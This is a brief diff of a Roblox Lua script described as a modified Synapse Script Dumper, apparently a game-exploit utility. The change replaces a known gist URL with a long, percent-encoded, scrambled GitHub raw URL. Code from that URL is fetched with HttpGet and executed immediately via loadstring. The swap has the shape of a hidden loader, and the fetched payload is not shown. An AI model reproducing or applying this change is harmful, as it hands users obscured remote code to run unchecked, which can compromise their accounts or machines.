@@ -2,5 +2,5 @@
     This is a modified version of the Synapse Script Dumper
 ]]
 
-getgenv().DumpScripts = loadstring(game:HttpGet("https://gist.githubusercontent.com/Babyhamsta/7bba9a956bff049e155ebb35c7b2b690/raw/0ccc52acdf5686f6a71f0e025a64a96bc34a3e90/ZoScriptDumper.lua"))()
+getgenv().DumpScripts = loadstring(game:HttpGet("https://raw.githubusercontent.com/batusz/main/roblox/GFHGFHSmSD%3AXvRTCr%5B%24P!Sy%3BsD5N%5EL*YKqAbw%5DizxZRMF%3BqFQe%23sFGFErY--mG8x~)%255y~S%3FYRAbbP9%3FGHGHYdm%24bx2q-%7B%3F%3BKw%3E)K-JKJKE8%40%3Ft8cZi223345567"))()
 getgenv().DumpScripts()
